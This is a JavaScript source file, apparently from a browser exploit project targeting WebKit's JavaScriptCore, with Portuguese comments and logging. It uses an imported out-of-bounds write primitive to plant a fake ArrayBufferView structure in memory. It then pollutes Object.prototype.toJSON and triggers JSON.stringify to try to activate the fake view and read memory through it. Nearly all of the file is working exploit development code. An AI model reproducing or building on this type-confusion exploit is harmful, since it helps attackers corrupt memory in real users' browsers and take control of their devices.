// js/script3/testRetypeOOB_AB_ViaShadowCraft.mjs
import { logS3, PAUSE_S3, MEDIUM_PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
import {
    triggerOOB_primitive,
    oob_array_buffer_real,
    oob_dataview_real,
    oob_write_absolute,
    oob_read_absolute,
    clearOOBEnvironment
} from '../core_exploit.mjs';
import { OOB_CONFIG, JSC_OFFSETS, WEBKIT_LIBRARY_INFO } from '../config.mjs';

// ============================================================
// DEFINIÇÕES DE CONSTANTES E VARIÁVEIS GLOBAIS
// ============================================================
const FNAME_MAIN = "ExploitLogic_v22_IsolateMemCrash";

// --- Constantes para a Estrutura Fake da ArrayBufferView em 0x58 ---
const FAKE_VIEW_BASE_OFFSET_IN_OOB = 0x58;
const FAKE_VIEW_STRUCTURE_ID          = 0x0200BEEF; 
const FAKE_VIEW_TYPEINFO_TYPE         = 0x17;       
const FAKE_VIEW_TYPEINFO_FLAGS        = 0x00;
const FAKE_VIEW_CELLINFO_INDEXINGTYPE = 0x0F;
const FAKE_VIEW_CELLINFO_STATE        = 0x01;
const FAKE_VIEW_ASSOCIATED_BUFFER_PTR = AdvancedInt64.Zero; 
const FAKE_VIEW_MVECTOR_VALUE         = AdvancedInt64.Zero; 
// MODIFICAÇÃO AQUI: Usar um m_length pequeno para teste
const FAKE_VIEW_MLENGTH_VALUE         = 0x100; // 256 elementos (1024 bytes se Uint32Array)
// const FAKE_VIEW_MLENGTH_VALUE_ORIGINAL = 0xFFFFFFFF; // Guardar o original se precisarmos
const FAKE_VIEW_MMODE_VALUE           = 0x00000000;     

const OOB_BUFFER_MARKER_OFFSET = 0x0; 
const OOB_BUFFER_MARKER_VALUE  = 0x41424344;
const FAKE_VIEW_SID_READ_OFFSET = FAKE_VIEW_BASE_OFFSET_IN_OOB; 
const OTHER_SID_READ_OFFSET    = 0x400; 
const OTHER_SID_READ_VALUE     = 0xFEEDFACE;

let getter_activation_details = null;

// ============================================================
// FUNÇÃO toJSON Poluída (mesma da v21)
// ============================================================
function toJSON_FocusActivationAttempt_v22() { // Renomeado levemente para clareza de versão
    const FNAME_toJSON = "toJSON_FocusActivation_v22";
    logS3(`[${FNAME_toJSON}] Getter ACIONADO!`, "vuln", FNAME_toJSON);
    getter_activation_details = {
        this_type: "N/A",
        this_length: "N/A",
        read_oob_marker: "N/A",
        read_fake_view_sid: "N/A",
        read_other_sid: "N/A",
        error: null
    };

    try {
        getter_activation_details.this_type = Object.prototype.toString.call(this);
        logS3(`  [${FNAME_toJSON}] this type: ${getter_activation_details.this_type}`, "info", FNAME_toJSON);

        getter_activation_details.this_length = this.length;
        logS3(`  [${FNAME_toJSON}] this.length: ${toHex(getter_activation_details.this_length)} (Decimal: ${getter_activation_details.this_length})`, "leak", FNAME_toJSON);

        // Verificamos contra o FAKE_VIEW_MLENGTH_VALUE que agora é pequeno (0x100)
        if (getter_activation_details.this_length === FAKE_VIEW_MLENGTH_VALUE || getter_activation_details.this_length === 0xFFFFFFFF) {
            logS3(`    !!!! POTENCIAL VIEW COM LENGTH MODIFICADO DETECTADA !!!! this.length: ${toHex(this.length)}`, "vuln", FNAME_toJSON);
            document.title = "MODIFIED_LEN_VIEW ACTIVE?!";

            try {
                const val_marker = this[OOB_BUFFER_MARKER_OFFSET / 4]; 
                getter_activation_details.read_oob_marker = toHex(val_marker);
                logS3(`    [View?] this[${OOB_BUFFER_MARKER_OFFSET / 4}] (lendo OOB_BUFFER_MARKER de ${toHex(OOB_BUFFER_MARKER_OFFSET)}): ${toHex(val_marker)} (Esperado: ${toHex(OOB_BUFFER_MARKER_VALUE)})`, "leak", FNAME_toJSON);
            } catch (e_read_marker) { /* ... */ }

            try {
                const val_fvsid = this[FAKE_VIEW_SID_READ_OFFSET / 4];
                getter_activation_details.read_fake_view_sid = toHex(val_fvsid);
                logS3(`    [View?] this[${FAKE_VIEW_SID_READ_OFFSET / 4}] (lendo FAKE_VIEW_SID de ${toHex(FAKE_VIEW_SID_READ_OFFSET)}): ${toHex(val_fvsid)} (Esperado: ${toHex(FAKE_VIEW_STRUCTURE_ID)})`, "leak", FNAME_toJSON);
            } catch (e_read_fvsid) { /* ... */ }
            
            try {
                const val_osid = this[OTHER_SID_READ_OFFSET / 4];
                getter_activation_details.read_other_sid = toHex(val_osid);
                logS3(`    [View?] this[${OTHER_SID_READ_OFFSET / 4}] (lendo OTHER_SID de ${toHex(OTHER_SID_READ_OFFSET)}): ${toHex(val_osid)} (Esperado: ${toHex(OTHER_SID_READ_VALUE)})`, "leak", FNAME_toJSON);
            } catch (e_read_osid) { /* ... */ }

        } else if (typeof getter_activation_details.this_length === 'number') {
            logS3(`    INFO: this.length (${toHex(this.length)}) não é o esperado para a SuperView (0xFFFFFFFF) nem o m_length de teste (0x100).`, "info", FNAME_toJSON);
        }
    } catch (e_main_getter) {
        logS3(`  [${FNAME_toJSON}] ERRO GERAL NO GETTER: ${e_main_getter.name} - ${e_main_getter.message}`, "critical", FNAME_toJSON);
        getter_activation_details.error = `${e_main_getter.name}: ${e_main_getter.message}`;
        document.title = `GETTER CRASH: ${e_main_getter.name}`;
    }
    return { toJSON_getter_executed: true, collected_details: getter_activation_details };
}

// ============================================================
// FUNÇÃO PRINCIPAL (v22_IsolateMemCrash)
// ============================================================
export async function sprayAndInvestigateObjectExposure() {
    const FNAME_CURRENT_TEST = `${FNAME_MAIN}.isolateMemCrashTrigger`;
    logS3(`--- Iniciando ${FNAME_CURRENT_TEST}: Isolar Causa do Erro de Memória (m_length=${toHex(FAKE_VIEW_MLENGTH_VALUE)}) ---`, "test", FNAME_CURRENT_TEST);
    document.title = `IsolateMemCrash v22 (len=${toHex(FAKE_VIEW_MLENGTH_VALUE)})`;

    getter_activation_details = null; 
    let trigger_obj = { p1: "trigger_data_v22", p2: { n1: 456 }}; 

    try {
        await triggerOOB_primitive();
        if (!oob_array_buffer_real) { throw new Error("OOB Init falhou."); }
        logS3("Ambiente OOB inicializado.", "info", FNAME_CURRENT_TEST);

        logS3(`PASSO 1: Plantando estrutura fake de ArrayBufferView em ${toHex(FAKE_VIEW_BASE_OFFSET_IN_OOB)} com m_length=${toHex(FAKE_VIEW_MLENGTH_VALUE)}...`, "info", FNAME_CURRENT_TEST);
        const sidOffset      = FAKE_VIEW_BASE_OFFSET_IN_OOB + JSC_OFFSETS.ArrayBufferView.STRUCTURE_ID_OFFSET;
        const typeInfoBaseOffset = FAKE_VIEW_BASE_OFFSET_IN_OOB + JSC_OFFSETS.JSCell.CELL_TYPEINFO_TYPE_FLATTENED_OFFSET;
        const bufferPtrOff   = FAKE_VIEW_BASE_OFFSET_IN_OOB + JSC_OFFSETS.ArrayBufferView.ASSOCIATED_ARRAYBUFFER_OFFSET;
        const mVectorOffset  = FAKE_VIEW_BASE_OFFSET_IN_OOB + JSC_OFFSETS.ArrayBufferView.M_VECTOR_OFFSET;
        const mLengthOffset  = FAKE_VIEW_BASE_OFFSET_IN_OOB + JSC_OFFSETS.ArrayBufferView.M_LENGTH_OFFSET;
        const mModeOffset    = FAKE_VIEW_BASE_OFFSET_IN_OOB + JSC_OFFSETS.ArrayBufferView.M_MODE_OFFSET;

        oob_write_absolute(sidOffset, FAKE_VIEW_STRUCTURE_ID, 4);
        oob_write_absolute(typeInfoBaseOffset + 0, FAKE_VIEW_TYPEINFO_TYPE, 1);
        oob_write_absolute(typeInfoBaseOffset + 1, FAKE_VIEW_TYPEINFO_FLAGS, 1);
        oob_write_absolute(typeInfoBaseOffset + 2, FAKE_VIEW_CELLINFO_INDEXINGTYPE, 1);
        oob_write_absolute(typeInfoBaseOffset + 3, FAKE_VIEW_CELLINFO_STATE, 1);
        oob_write_absolute(bufferPtrOff, FAKE_VIEW_ASSOCIATED_BUFFER_PTR, 8); 
        oob_write_absolute(mVectorOffset, FAKE_VIEW_MVECTOR_VALUE, 8);
        oob_write_absolute(mLengthOffset, FAKE_VIEW_MLENGTH_VALUE, 4); // Usando o m_length modificado
        oob_write_absolute(mModeOffset, FAKE_VIEW_MMODE_VALUE, 4);
        logS3(`  Estrutura fake plantada. SID: ${toHex(FAKE_VIEW_STRUCTURE_ID)}, m_vec: ${FAKE_VIEW_MVECTOR_VALUE.toString(true)}, m_len: ${toHex(FAKE_VIEW_MLENGTH_VALUE)}.`, "good", FNAME_CURRENT_TEST);

        oob_write_absolute(OOB_BUFFER_MARKER_OFFSET, OOB_BUFFER_MARKER_VALUE, 4);
        logS3(`  Plantado OOB_BUFFER_MARKER_VALUE (${toHex(OOB_BUFFER_MARKER_VALUE)}) em ${toHex(OOB_BUFFER_MARKER_OFFSET)}`, "info", FNAME_CURRENT_TEST);
        oob_write_absolute(OTHER_SID_READ_OFFSET, OTHER_SID_READ_VALUE, 4);
        logS3(`  Plantado OTHER_SID_READ_VALUE (${toHex(OTHER_SID_READ_VALUE)}) em ${toHex(OTHER_SID_READ_OFFSET)}`, "info", FNAME_CURRENT_TEST);
        
        logS3("Pausa de 100ms após plantações...", "info", FNAME_CURRENT_TEST);
        await PAUSE_S3(100);
        logS3("Pausa concluída. Prosseguindo para PASSO 2 (JSON.stringify).", "info", FNAME_CURRENT_TEST);


        logS3(`PASSO 2: Tentando ativação especulativa via JSON.stringify e toJSON poluído...`, "test", FNAME_CURRENT_TEST);
        const ppKey = 'toJSON';
        let originalToJSONDescriptor = Object.getOwnPropertyDescriptor(Object.prototype, ppKey);
        let pollutionApplied = false;

        try {
            Object.defineProperty(Object.prototype, ppKey, {
                value: toJSON_FocusActivationAttempt_v22, 
                writable: true, configurable: true, enumerable: false
            });
            pollutionApplied = true;
            logS3(`  Object.prototype.${ppKey} poluído com ${toJSON_FocusActivationAttempt_v22.name}.`, "info", FNAME_CURRENT_TEST);

            logS3(`  Chamando JSON.stringify(trigger_obj)... Trigger: ${JSON.stringify(trigger_obj)}`, "info", FNAME_CURRENT_TEST);
            await PAUSE_S3(50); 
            let stringifyResult = JSON.stringify(trigger_obj); 
            
            logS3(`  JSON.stringify completou. Resultado (parcial): ${String(stringifyResult).substring(0, 300)}`, "info", FNAME_CURRENT_TEST);
            if (getter_activation_details) {
                logS3(`  Detalhes coletados pelo getter toJSON: ${JSON.stringify(getter_activation_details)}`, "leak", FNAME_CURRENT_TEST);
                 if (getter_activation_details.this_length === FAKE_VIEW_MLENGTH_VALUE && getter_activation_details.read_oob_marker === toHex(OOB_BUFFER_MARKER_VALUE) ) { // Ou 0xFFFFFFFF se o length esperado for esse
                    logS3("    !!!! SUCESSO ESPECULATIVO !!!! 'this' no toJSON parece ser a VIEW FUNCIONAL com m_length modificado!", "vuln", FNAME_CURRENT_TEST);
                    document.title = "MODIFIED_VIEW ACTIVATED & READ OK!";
                } else if (getter_activation_details.error) {
                     logS3(`    PROBLEMA: Erro no getter: ${getter_activation_details.error}`, "error", FNAME_CURRENT_TEST);
                } else {
                    logS3("    INFO: Getter toJSON executado, mas 'this' não se comportou como a View esperada ou leituras falharam.", "info", FNAME_CURRENT_TEST);
                }
            } else {
                 logS3("    AVISO: getter_activation_details é nulo.", "critical", FNAME_CURRENT_TEST);
            }

        } catch (e_stringify) {
            logS3(`  ERRO CRÍTICO durante JSON.stringify(trigger_obj): ${e_stringify.name} - ${e_stringify.message}`, "critical", FNAME_CURRENT_TEST);
            document.title = `JSON_STRINGIFY CRASH: ${e_stringify.name}`;
        } finally {
            if (pollutionApplied) {
                if (originalToJSONDescriptor) Object.defineProperty(Object.prototype, ppKey, originalToJSONDescriptor);
                else delete Object.prototype[ppKey];
                logS3(`  Object.prototype.${ppKey} restaurado.`, "info", FNAME_CURRENT_TEST);
            }
        }

    } catch (e) {
        logS3(`ERRO CRÍTICO GERAL: ${e.message}`, "critical", FNAME_CURRENT_TEST);
        if (e.stack) logS3(`Stack: ${e.stack}`, "critical", FNAME_CURRENT_TEST);
        document.title = `${FNAME_MAIN} FALHOU CRITICAMENTE!`;
    } finally {
        clearOOBEnvironment();
        logS3(`--- ${FNAME_CURRENT_TEST} Concluído ---`, "test", FNAME_CURRENT_TEST);
        if (!document.title.includes("ACTIVATED") && !document.title.includes("HIT") && !document.title.includes("FALHOU") && !document.title.includes("CRASH") && !document.title.includes("ERR")) {
            document.title = `${FNAME_MAIN} Done`;
        }
    }
}
